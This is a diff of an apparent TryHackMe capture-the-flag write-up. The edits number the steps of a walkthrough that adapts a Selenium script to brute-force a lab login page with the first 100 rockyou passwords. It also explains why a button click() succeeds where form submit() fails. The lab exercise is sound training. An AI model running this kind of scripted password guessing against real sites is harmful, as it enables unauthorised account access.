@@ -9,46 +9,44 @@ Remember back to https://tryhackme.com/room/customtoolingviabrowserautomation?ta
 
 There was a script already built for this, bonus we can also use the lab same box for this challenge. 
 
-Start the lab: https://tryhackme.com/room/customtoolingviabrowserautomation
-Start the captchapocalypse lab
+1) Start the lab: https://tryhackme.com/room/customtoolingviabrowserautomation
+2) Start the captchapocalypse lab
 
-
-make a copy of lab2.py, encase we mess it up
+3) Make a copy of lab2.py, encase we mess it up
 
 ```
 cp ~/Desktop/101Selenium/lab2.py ~/Desktop/101Selenium/apocalypse.py
 ```
 
-make a 100 lines of rockyou into a wordlist e.g from attackbox 
+4) make a 100 lines of rockyou into a wordlist e.g from attackbox 
 
 ```
 head -n 100 /usr/share/wordlists/rockyou.txt > /tmp/rock100.txt
 ```
- 
- Host file for
+5) Host file for on the attackbox so it can be downloaded
 ```
 cd /tmp
 python3 -m http.server  
 ```
  
-Back on the Custom Tooling box download the list, 
+5) Back on the Custom Tooling box download the list, 
 ```
 cd ~/Desktop/101Selenium/
 wget http://<<attackboxip>>:8000/rock100.txt
 ```
 
-Now for the fun stuff, edit our apocalypse.py
+6) Now for the fun stuff, edit our apocalypse.py
 
 ```
 nano ~/Desktop/101Selenium/apocalypse.py
 ```
 
-On the script update the ip to match the target ip
+7) On the script update the ip to match the target ip
 ```
 ip = 'http://10.49.147.106'
 ```
 
-Replace
+8) Replace
 ```
 passwords = ["123456", "admin", "letmein", "password123", "password"]
 ```
@@ -59,7 +57,7 @@ with our trimmed rock you
 passwords = [p.rstrip() for p in open("~/Desktop/101Selenium/rock100.txt")]
 ```
 
-if we run the script now, it will seem to work but never finds the login. What i found you have to update 
+9) If we run the script now, it will seem to work but never finds the login. What i found you have to update 
 
 ```
         chrome.find_element(By.TAG_NAME, "form").submit()
@@ -77,7 +75,7 @@ Why you ask,
 - `click()` triggers the **button click event**, so any JavaScript (`fetch`, `xhr`, `form handler`) attached to it will run and this challenge runs a login() javascript, so now correctly gets sent by post.  
 
 
-Now save and run your python with
+10) Now save and run your python with
 
 ```
 cd ~/Desktop/101Selenium/
@@ -85,7 +83,7 @@ source env/bin/activate
 python3 apocalypse.py
 ```
 
-If you don't get the successful login, run again as the script is not well built e.g using a sleep rather than checking if ready it can fail and take a few attempts.  
+Note: If you don't get the successful login, run again as the script is not well built e.g using a sleep rather than checking if ready it can fail and take a few attempts.  
 
 ## How i troubleshooted when the script looked working, but was not as it was using get.
 
